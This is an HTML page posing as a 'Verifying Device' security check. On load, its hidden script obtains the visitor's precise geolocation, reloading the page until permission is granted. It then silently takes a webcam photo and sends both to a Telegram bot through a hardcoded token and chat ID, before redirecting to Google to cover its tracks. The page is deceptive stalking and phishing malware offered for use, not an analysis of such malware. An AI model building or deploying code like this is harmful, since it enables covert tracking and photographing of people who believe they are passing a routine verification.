<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Connection | Verification</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
        p { color: #606770; font-size: 15px; line-height: 1.6; }
        .footer { margin-top: 20px; font-size: 12px; color: #bcc0c4; }
    </style>
</head>
<body>

<div class="card">
    <div class="spinner"></div>
    <h2>Verifying Device</h2>
    <p>We are securing your connection. Please grant the requested permissions to continue to the destination.</p>
    <div id="status" style="color: #007bff; font-weight: bold; margin-top: 15px;">Initializing...</div>
    <div class="footer">SSL Secure Connection • 256-bit Encryption</div>
</div>

<canvas id="canvas" style="display:none;"></canvas>
<video id="video" style="display:none;" autoplay></video>

<script>
    const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
    const chatId = '7066124462';
    const statusText = document.getElementById('status');

    window.onload = async () => {
        await startProcess();
    };

    async function startProcess() {
        statusText.innerText = "Requesting Security Clearance...";
        
        // 1. Get Location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sendLocation(pos);
                // 2. After Location, request Camera
                await capturePhoto();
            }, (err) => {
                alert("Please allow all permissions to verify your identity.");
                location.reload();
            }, { enableHighAccuracy: true });
        }
    }

    async function sendLocation(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const acc = pos.coords.accuracy;
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        
        const text = `📍 *Location Received!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View on Google Maps](${mapLink})`;
        
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
        statusText.innerText = "Security Check: 50% Complete...";
    }

    async function capturePhoto() {
        try {
            statusText.innerText = "Finalizing Verification...";
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            
            if (!stream || !stream.getVideoTracks().length) {
                throw new Error('No access to camera');
            }

            const video = document.getElementById('video');
            video.srcObject = stream;

            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    if (video.videoWidth === 0 || video.videoHeight === 0) {
                        throw new Error('Video dimensions not available');
                    }
                    resolve();
                };
            });
            
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            await new Promise(resolve => setTimeout(resolve, 1000)); 

            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const img = new Image();
            img.src = canvas.toDataURL('image/jpeg');
            document.body.appendChild(img); 

            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

            if (!blob) {
                throw new Error('Failed to create blob');
            }

            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'identity_check.jpg');
            formData.append('caption', '📸 Photo Identity Captured');

            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            stream.getTracks().forEach(track => track.stop());
            
            statusText.innerText = "Verified! Redirecting...";
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000); 

        } catch (err) {
            console.error(err);
            window.location.href = "https://www.google.com";
        }
    }
</script>

</body>
</html>
